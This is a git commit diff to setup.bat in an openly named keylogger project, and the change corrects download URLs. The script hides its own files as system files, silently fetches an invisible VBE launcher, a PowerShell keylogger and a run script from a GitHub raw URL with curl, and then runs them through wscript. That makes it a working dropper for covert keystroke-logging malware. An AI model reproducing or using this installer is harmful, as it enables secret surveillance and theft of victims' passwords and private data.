8f532959cc5b5fa1693cf9a05deb7ec49927e32d
Ale-cyber <59205495+Ale-cyber@users.noreply.github.com>
2021-09-11 17:44:52 +0200

    Update setup.bat

--- KeyLogger/setup.bat
+++ KeyLogger/setup.bat
@@ -6,7 +6,7 @@ if not exist t\ (
 attrib +s +h t
 attrib +s +h s.bat
 cd t
-curl -s https://raw.githubusercontent.com/Ale-cyber/test/KeyLogger/master/invisible.vbe -o i.vbe
-curl -s https://raw.githubusercontent.com/Ale-cyber/test/KeyLogger/master/keylogger.ps1 -o p.ps1
-curl -s https://raw.githubusercontent.com/Ale-cyber/test/KeyLogger/master/run.bat -o r.bat
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/invisible.vbe -o i.vbe
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/keylogger.ps1 -o p.ps1
+curl -s https://raw.githubusercontent.com/Ale-cyber/test/master/KeyLogger/run.bat -o r.bat
 wscript.exe "i.vbe" "r.bat"
